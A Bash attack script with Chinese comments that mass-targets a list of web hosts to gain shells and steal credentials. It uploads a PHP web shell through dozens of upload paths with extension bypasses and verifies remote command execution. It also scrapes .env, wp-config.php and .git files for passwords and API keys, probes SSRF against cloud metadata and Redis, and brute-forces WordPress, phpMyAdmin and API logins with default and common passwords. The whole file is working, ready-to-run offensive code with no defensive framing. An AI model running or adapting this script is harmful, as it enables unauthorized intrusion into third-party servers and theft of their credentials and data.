#!/bin/bash
# 最大化Shell + 极低误报 + 凭证爆破
# 核心：五重验证 + 内容验证 + 智能并发 + 凭证复用

source /root/.api_keys
PASS_DICT="/root/passwords/master_passwords.txt"
TOP100="/root/passwords/top100.txt"
DEFAULT_CREDS="/root/passwords/default_creds.txt"

OUT="/root/max_shell_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUT/shells

# 复用之前的存活目标
PREV=$(ls -td /root/*attack_* 2>/dev/null | head -1)
if [ -n "$PREV" ] && [ -f "$PREV/alive/http_alive.txt" ]; then
    cp $PREV/alive/http_alive.txt $OUT/targets.txt
else
    echo "❌ 找不到之前的存活目标"
    exit 1
fi

TOTAL=$(wc -l < $OUT/targets.txt)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最大化Shell + 极低误报"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "目标: $TOTAL"
echo "策略: 高价值优先 + 五重验证 + 内容验证 + 凭证爆破"
echo "字典: master_passwords.txt + top100.txt + default_creds.txt"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ==========================================
# 1. 文件上传（最高优先级，50路径×15绕过）
# ==========================================
echo ""
echo "[1/8] 🚀 文件上传（50路径×15绕过，并发15，五重验证）..."
cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
    url="{}"
    flag="$(echo {} | md5sum | cut -c1-8)"
    
    for path in /upload /upload.php /fileupload /api/upload /api/file/upload /api/File/UploadFile \
                /uploadFile /upload.aspx /admin/upload /user/upload /file/upload /attachment/upload \
                /api/v1/upload /api/v2/upload /media/upload /image/upload /files/upload \
                /document/upload /photo/upload /avatar/upload /content/upload /assets/upload \
                /static/upload /public/upload /uploads /uploader /filemanager /manager/upload \
                /editor/upload /ckeditor/upload /ckfinder/upload /elfinder/upload /tinymce/upload \
                /summernote/upload /uploadify /swfupload /plupload /fineuploader /dropzone \
                /jquery-file-upload /blueimp /uploadimage /uploadpic /imgupload /picupload \
                /photoupload /fileUpload /File/Upload /Upload/File /api/attachment /api/uploadFile; do
        
        for ext in php PhP pHp phP pHP Php PHP5 phtml php3 php4 php5 php7 phar; do
            echo "<?php echo \"U${flag}\";@system(\$_GET[0]); ?>" > /tmp/u_$$_${ext}
            
            # 上传
            resp=$(curl -skL -m 8 "$url$path" -F "file=@/tmp/u_$$_${ext}" -F "upload=@/tmp/u_$$_${ext}" \
                -H "User-Agent: Mozilla/5.0" 2>/dev/null)
            
            # 提取shell URL（严格匹配）
            shell=$(echo "$resp" | grep -oE "https?://[a-zA-Z0-9._-]+/[a-zA-Z0-9._/-]+\.${ext}" | head -1)
            
            # 验证1: URL格式正确
            if [ -n "$shell" ] && echo "$shell" | grep -qE "^https?://" && echo "$shell" | grep -q "\.${ext}$"; then
                # 验证2: 访问shell，检查flag
                v1=$(curl -skL -m 5 "$shell" 2>/dev/null)
                if echo "$v1" | grep -q "U${flag}"; then
                    # 验证3: 命令执行测试
                    v2=$(curl -skL -m 5 "$shell?0=echo+test123" 2>/dev/null)
                    if echo "$v2" | grep -q "test123"; then
                        # 验证4: 系统命令测试
                        v3=$(curl -skL -m 5 "$shell?0=id" 2>/dev/null)
                        if echo "$v3" | grep -qE "uid=|gid="; then
                            # 验证5: 确保不是错误页面
                            if ! echo "$v3" | grep -qiE "error|404|not found|forbidden"; then
                                echo "$shell" >> '"$OUT"'/shells/01_upload.txt
                                rm -f /tmp/u_$$_${ext}
                                exit 0
                            fi
                        fi
                    fi
                fi
            fi
            rm -f /tmp/u_$$_${ext}
        done
    done
' &
wait
UPLOAD=$(wc -l < $OUT/shells/01_upload.txt 2>/dev/null || echo 0)
echo "  ✅ Upload Shell: $UPLOAD"

# ==========================================
# 2. 敏感文件（内容验证）
# ==========================================
echo "[2/8] 📁 敏感文件（内容验证，并发20）..."
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    # .env文件（验证KEY=VALUE格式）
    env_resp=$(curl -skL -m 5 "$url/.env" 2>/dev/null)
    if [ $(echo "$env_resp" | wc -c) -gt 50 ]; then
        # 验证：包含KEY=VALUE格式，且不是HTML
        if echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
            # 验证：包含常见环境变量名
            if echo "$env_resp" | grep -qiE "DB_|APP_|API_|SECRET|KEY|PASSWORD"; then
                echo "$url/.env" >> '"$OUT"'/shells/02_env.txt
            fi
        fi
    fi
    
    # config.php（验证PHP语法）
    php_resp=$(curl -skL -m 5 "$url/config.php" 2>/dev/null)
    if [ $(echo "$php_resp" | wc -c) -gt 100 ]; then
        # 验证：包含PHP标签和配置
        if echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
           ! echo "$php_resp" | grep -qiE "<html|<body|404|not found|forbidden"; then
            echo "$url/config.php" >> '"$OUT"'/shells/02_config.txt
        fi
    fi
    
    # wp-config.php（WordPress特定验证）
    wp_resp=$(curl -skL -m 5 "$url/wp-config.php" 2>/dev/null)
    if [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
        if echo "$wp_resp" | grep -qE "<?php" && echo "$wp_resp" | grep -qiE "DB_NAME|DB_USER|DB_PASSWORD" && \
           ! echo "$wp_resp" | grep -qiE "<html|<body|404"; then
            echo "$url/wp-config.php" >> '"$OUT"'/shells/02_wpconfig.txt
        fi
    fi
    
    # .git/config（验证Git配置格式）
    git_resp=$(curl -skL -m 5 "$url/.git/config" 2>/dev/null)
    if [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
        if echo "$git_resp" | grep -qE "\[.*\]" && echo "$git_resp" | grep -qiE "remote|url|branch" && \
           ! echo "$git_resp" | grep -qiE "<html|<body|404"; then
            echo "$url/.git/config" >> '"$OUT"'/shells/02_git.txt
        fi
    fi
' &
wait
ENV=$(wc -l < $OUT/shells/02_env.txt 2>/dev/null || echo 0)
CONFIG=$(wc -l < $OUT/shells/02_config.txt 2>/dev/null || echo 0)
WPCONFIG=$(wc -l < $OUT/shells/02_wpconfig.txt 2>/dev/null || echo 0)
GIT=$(wc -l < $OUT/shells/02_git.txt 2>/dev/null || echo 0)
FILES=$((ENV + CONFIG + WPCONFIG + GIT))
echo "  ✅ 敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG git:$GIT)"

# ==========================================
# 3. 未授权API（数据验证）
# ==========================================
echo "[3/8] 🌐 未授权API（数据验证，并发20）..."
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    for api in /api/users /api/user /api/admin /api/data /api/v1/users /api/v2/users /graphql; do
        resp=$(curl -skL -m 6 "$url$api" -H "Accept: application/json" 2>/dev/null)
        
        # 验证1: 是有效JSON
        if echo "$resp" | jq . >/dev/null 2>&1; then
            # 验证2: 包含真实数据字段
            if echo "$resp" | jq . | grep -qiE "\"id\"|\"email\"|\"username\"|\"name\"|\"user\""; then
                # 验证3: 不是错误响应
                if ! echo "$resp" | jq . | grep -qiE "error|unauthorized|forbidden|access denied"; then
                    # 验证4: 数据量足够（>200字符）
                    if [ $(echo "$resp" | wc -c) -gt 200 ]; then
                        echo "$url$api" >> '"$OUT"'/shells/03_api.txt
                        break
                    fi
                fi
            fi
        fi
    done
' &
wait
API=$(wc -l < $OUT/shells/03_api.txt 2>/dev/null || echo 0)
echo "  ✅ 未授权API: $API"

# ==========================================
# 4. Git泄露（多重验证）
# ==========================================
echo "[4/8] 🔓 Git泄露（多重验证，并发30）..."
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    
    # 验证1: .git/HEAD格式正确
    head_resp=$(curl -skL -m 4 "$url/.git/HEAD" 2>/dev/null)
    if echo "$head_resp" | grep -qE "^ref: refs/heads/" && [ $(echo "$head_resp" | wc -c) -lt 200 ]; then
        # 验证2: .git/config存在
        config_resp=$(curl -skL -m 4 "$url/.git/config" 2>/dev/null)
        if echo "$config_resp" | grep -qE "\[.*\]" && echo "$config_resp" | grep -qiE "remote|url"; then
            # 验证3: 不是错误页面
            if ! echo "$head_resp" | grep -qiE "<html|<body|404|not found"; then
                echo "$url" >> '"$OUT"'/shells/04_git.txt
            fi
        fi
    fi
' &
wait
GIT_LEAK=$(wc -l < $OUT/shells/04_git.txt 2>/dev/null || echo 0)
echo "  ✅ Git泄露: $GIT_LEAK"

# ==========================================
# 5. WordPress（多重检测）
# ==========================================
echo "[5/8] 🎯 WordPress（多重检测，并发30）..."
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    resp=$(curl -skL -m 4 "$url" 2>/dev/null)
    
    # 验证1: 包含wp-content
    if echo "$resp" | grep -qi "wp-content"; then
        # 验证2: 包含WordPress特征
        if echo "$resp" | grep -qiE "wp-includes|wp-admin|wordpress|wp-json"; then
            # 验证3: 不是误报（排除CDN引用）
            if echo "$resp" | grep -qiE "wp-content/themes|wp-content/plugins|wp-content/uploads"; then
                echo "$url" >> '"$OUT"'/shells/05_wordpress.txt
            fi
        fi
    fi
' &
wait
WP=$(wc -l < $OUT/shells/05_wordpress.txt 2>/dev/null || echo 0)
echo "  ✅ WordPress: $WP"

# ==========================================
# 6. phpMyAdmin（登录页面验证）
# ==========================================
echo "[6/8] 🔓 phpMyAdmin（登录页面验证，并发30）..."
cat $OUT/targets.txt | xargs -P 30 -I {} bash -c '
    url="{}"
    
    for path in "" /pma /phpmyadmin /phpMyAdmin /PMA /PMA /dbadmin /mysql; do
        resp=$(curl -skL -m 4 "$url$path" 2>/dev/null)
        
        # 验证：包含phpMyAdmin登录表单
        if echo "$resp" | grep -qiE "phpmyadmin|pma_|server.*password" && \
           echo "$resp" | grep -qiE "<form|<input.*type.*password" && \
           ! echo "$resp" | grep -qiE "404|not found|forbidden"; then
            echo "$url$path" >> '"$OUT"'/shells/06_phpmyadmin.txt
            break
        fi
    done
' &
wait
PMA=$(wc -l < $OUT/shells/06_phpmyadmin.txt 2>/dev/null || echo 0)
echo "  ✅ phpMyAdmin: $PMA"

# ==========================================
# 7. SSRF端点（元数据验证）
# ==========================================
echo "[7/8] 🔗 SSRF端点（元数据验证，并发15）..."
cat $OUT/targets.txt | xargs -P 15 -I {} bash -c '
    url="{}"
    
    for path in /api/fetch /api/proxy /api/url /api/download /fetch /proxy /download; do
        # 测试AWS元数据
        resp=$(curl -skL -m 6 "$url$path?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
        if echo "$resp" | grep -qiE "instance-id|ami-id|local-ipv4" && \
           ! echo "$resp" | grep -qiE "error|forbidden|403"; then
            echo "$url$path" >> '"$OUT"'/shells/07_ssrf.txt
            break
        fi
        
        # 测试内网Redis
        resp2=$(curl -skL -m 6 "$url$path?url=http://127.0.0.1:6379" 2>/dev/null)
        if echo "$resp2" | grep -qiE "PONG|redis|REDIS" && \
           ! echo "$resp2" | grep -qiE "error|forbidden"; then
            echo "$url$path" >> '"$OUT"'/shells/07_ssrf.txt
            break
        fi
    done
' &
wait
SSRF=$(wc -l < $OUT/shells/07_ssrf.txt 2>/dev/null || echo 0)
echo "  ✅ SSRF: $SSRF"

# ==========================================
# 8. 备份文件（内容验证）
# ==========================================
echo "[8/8] 💾 备份文件（内容验证，并发20）..."
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    domain=$(echo "$url" | sed "s|https\?://||" | cut -d/ -f1 | cut -d: -f1)
    
    for name in $domain backup www wwwroot web site database db sql data; do
        for ext in sql zip tar tar.gz bak old; do
            resp=$(curl -skL -m 5 "$url/${name}.${ext}" -I 2>/dev/null)
            if echo "$resp" | grep -qE "^HTTP.*200" && \
               echo "$resp" | grep -qiE "Content-Type:.*(application|text|sql|zip|tar)"; then
                # 验证：下载部分内容检查
                content=$(curl -skL -m 5 "$url/${name}.${ext}" 2>/dev/null | head -c 500)
                if [ $(echo "$content" | wc -c) -gt 100 ]; then
                    # SQL文件验证
                    if [ "${ext}" = "sql" ] && echo "$content" | grep -qiE "CREATE TABLE|INSERT INTO|DROP TABLE"; then
                        echo "$url/${name}.${ext}" >> '"$OUT"'/shells/08_backup.txt
                        break 2
                    fi
                    # 压缩文件验证（检查文件头）
                    if [ "${ext}" = "zip" ] && echo "$content" | head -c 4 | grep -q "PK"; then
                        echo "$url/${name}.${ext}" >> '"$OUT"'/shells/08_backup.txt
                        break 2
                    fi
                fi
            fi
        done
    done
' &
wait
BACKUP=$(wc -l < $OUT/shells/08_backup.txt 2>/dev/null || echo 0)
echo "  ✅ 备份文件: $BACKUP"

# ==========================================
# 9. 凭证提取与复用（从.env/config.php）
# ==========================================
echo "[9/12] 🔑 凭证提取与复用..."
mkdir -p $OUT/shells/creds

# 从.env文件提取凭证
[ -f $OUT/shells/02_env.txt ] && cat $OUT/shells/02_env.txt | while read env_url; do
    env_content=$(curl -skL -m 5 "$env_url" 2>/dev/null)
    # 提取数据库凭证
    echo "$env_content" | grep -iE "DB_PASSWORD|DB_PASS|PASSWORD|SECRET" | grep -v "^#" | \
        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_passwords.txt 2>/dev/null
    # 提取API密钥
    echo "$env_content" | grep -iE "API_KEY|SECRET_KEY|TOKEN" | grep -v "^#" | \
        sed 's/.*=//' | tr -d ' "\047' | grep -v "^$" >> $OUT/shells/creds/env_keys.txt 2>/dev/null
done

# 从config.php提取凭证
[ -f $OUT/shells/02_config.txt ] && cat $OUT/shells/02_config.txt | while read config_url; do
    config_content=$(curl -skL -m 5 "$config_url" 2>/dev/null)
    # 提取密码
    echo "$config_content" | grep -iE "password|passwd" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/config_passwords.txt 2>/dev/null
done

# 从wp-config.php提取数据库凭证
[ -f $OUT/shells/02_wpconfig.txt ] && cat $OUT/shells/02_wpconfig.txt | while read wpconfig_url; do
    wp_content=$(curl -skL -m 5 "$wpconfig_url" 2>/dev/null)
    # 提取DB_PASSWORD
    echo "$wp_content" | grep -iE "DB_PASSWORD" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null
    # 提取DB_USER
    echo "$wp_content" | grep -iE "DB_USER" | grep -oE "['\"][^'\"]*['\"]" | \
        tr -d '"\047' | grep -v "^$" >> $OUT/shells/creds/wp_db_users.txt 2>/dev/null
done

ENV_PASS=$(wc -l < $OUT/shells/creds/env_passwords.txt 2>/dev/null || echo 0)
CONFIG_PASS=$(wc -l < $OUT/shells/creds/config_passwords.txt 2>/dev/null || echo 0)
WP_PASS=$(wc -l < $OUT/shells/creds/wp_db_passwords.txt 2>/dev/null || echo 0)
echo "  ✅ 提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"

# ==========================================
# 10. WordPress弱口令爆破（智能字典）
# ==========================================
echo "[10/12] 🔓 WordPress弱口令（智能字典，并发10）..."
[ -f $OUT/shells/05_wordpress.txt ] && cat $OUT/shells/05_wordpress.txt | head -100 | xargs -P 10 -I {} bash -c '
    url="{}"
    wp_login="${url}/wp-login.php"
    
    # 先测试默认凭证（快速）
    for cred in "admin:admin" "admin:password" "admin:123456" "admin:admin123" \
                "administrator:administrator" "root:root" "test:test"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        resp=$(curl -skL -m 5 "$wp_login" -d "log=$user&pwd=$pass&wp-submit=Log+In" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "incorrect|error|invalid|login" && \
           echo "$resp" | grep -qiE "dashboard|admin|wp-admin"; then
            echo "$url|$user:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
            exit 0
        fi
    done
    
    # 再测试top100密码（admin用户）
    [ -f '"$TOP100"' ] && while read pass; do
        resp=$(curl -skL -m 4 "$wp_login" -d "log=admin&pwd=$pass&wp-submit=Log+In" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "incorrect|error|invalid" && \
           echo "$resp" | grep -qiE "dashboard|admin"; then
            echo "$url|admin:$pass" >> '"$OUT"'/shells/10_wp_creds.txt
            exit 0
        fi
    done < '"$TOP100"'
' &
wait
WP_CREDS=$(wc -l < $OUT/shells/10_wp_creds.txt 2>/dev/null || echo 0)
echo "  ✅ WordPress凭证: $WP_CREDS"

# ==========================================
# 11. phpMyAdmin弱口令爆破（智能字典）
# ==========================================
echo "[11/12] 🔓 phpMyAdmin弱口令（智能字典，并发10）..."
[ -f $OUT/shells/06_phpmyadmin.txt ] && cat $OUT/shells/06_phpmyadmin.txt | head -50 | xargs -P 10 -I {} bash -c '
    url="{}"
    
    # 先测试默认凭证
    for cred in "root:" "root:root" "root:password" "root:123456" \
                "admin:admin" "admin:password" "root:toor"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        # phpMyAdmin登录
        resp=$(curl -skL -m 5 "$url" -d "pma_username=$user&pma_password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
           echo "$resp" | grep -qiE "main|database|server"; then
            echo "$url|$user:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
            exit 0
        fi
    done
    
    # 测试空密码
    resp=$(curl -skL -m 5 "$url" -d "pma_username=root&pma_password=" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
    if ! echo "$resp" | grep -qiE "cannot|error" && \
       echo "$resp" | grep -qiE "main|database"; then
        echo "$url|root:" >> '"$OUT"'/shells/11_pma_creds.txt
        exit 0
    fi
    
    # 测试top100（root用户）
    [ -f '"$TOP100"' ] && while read pass; do
        resp=$(curl -skL -m 4 "$url" -d "pma_username=root&pma_password=$pass" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>/dev/null)
        
        if ! echo "$resp" | grep -qiE "cannot|error|access denied" && \
           echo "$resp" | grep -qiE "main|database"; then
            echo "$url|root:$pass" >> '"$OUT"'/shells/11_pma_creds.txt
            exit 0
        fi
    done < '"$TOP100"'
' &
wait
PMA_CREDS=$(wc -l < $OUT/shells/11_pma_creds.txt 2>/dev/null || echo 0)
echo "  ✅ phpMyAdmin凭证: $PMA_CREDS"

# ==========================================
# 12. 默认凭证快速检测（API/管理后台）
# ==========================================
echo "[12/12] 🔑 默认凭证检测（API/后台，并发20）..."
cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
    url="{}"
    
    # API默认凭证测试
    for api_path in /api/login /api/auth /api/admin/login /admin/login /login; do
        for cred in "admin:admin" "admin:password" "admin:123456" "root:root"; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            
            resp=$(curl -skL -m 4 "$url$api_path" -X POST \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"$user\",\"password\":\"$pass\"}" 2>/dev/null)
            
            if echo "$resp" | grep -qiE "token|success|true|200" && \
               ! echo "$resp" | grep -qiE "error|invalid|incorrect|unauthorized"; then
                echo "$url$api_path|$user:$pass" >> '"$OUT"'/shells/12_default_creds.txt
                break 2
            fi
        done
    done
' &
wait
DEFAULT_CREDS_COUNT=$(wc -l < $OUT/shells/12_default_creds.txt 2>/dev/null || echo 0)
echo "  ✅ 默认凭证: $DEFAULT_CREDS_COUNT"

# ==========================================
# 统计汇总
# ==========================================
TOTAL_SHELLS=$((UPLOAD + FILES + API + GIT_LEAK + SSRF + BACKUP))
TOTAL_CREDS=$((WP_CREDS + PMA_CREDS + DEFAULT_CREDS_COUNT))

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎉 攻击完成（极低误报 + 凭证爆破）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "文件上传Shell: $UPLOAD"
echo "敏感文件: $FILES (.env:$ENV config:$CONFIG wp-config:$WPCONFIG git:$GIT)"
echo "未授权API: $API"
echo "Git泄露: $GIT_LEAK"
echo "WordPress: $WP"
echo "phpMyAdmin: $PMA"
echo "SSRF: $SSRF"
echo "备份文件: $BACKUP"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "凭证爆破:"
echo "  WordPress凭证: $WP_CREDS"
echo "  phpMyAdmin凭证: $PMA_CREDS"
echo "  默认凭证: $DEFAULT_CREDS_COUNT"
echo "  提取凭证: env:$ENV_PASS config:$CONFIG_PASS wp:$WP_PASS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 总计Shell/漏洞: $TOTAL_SHELLS"
echo "🎯 总计凭证: $TOTAL_CREDS"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "结果目录: $OUT/shells/"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 显示关键结果
[ $UPLOAD -gt 0 ] && echo "" && echo "🚀 Upload Shell:" && cat $OUT/shells/01_upload.txt
[ $ENV -gt 0 ] && echo "" && echo "📁 .env文件:" && head -10 $OUT/shells/02_env.txt
[ $API -gt 0 ] && echo "" && echo "🌐 未授权API:" && head -10 $OUT/shells/03_api.txt
[ $SSRF -gt 0 ] && echo "" && echo "🔗 SSRF:" && cat $OUT/shells/07_ssrf.txt
[ $WP_CREDS -gt 0 ] && echo "" && echo "🔑 WordPress凭证:" && cat $OUT/shells/10_wp_creds.txt
[ $PMA_CREDS -gt 0 ] && echo "" && echo "🔑 phpMyAdmin凭证:" && cat $OUT/shells/11_pma_creds.txt
[ $DEFAULT_CREDS_COUNT -gt 0 ] && echo "" && echo "🔑 默认凭证:" && head -10 $OUT/shells/12_default_creds.txt
[ $ENV_PASS -gt 0 ] && echo "" && echo "🔑 提取的密码:" && head -10 $OUT/shells/creds/env_passwords.txt
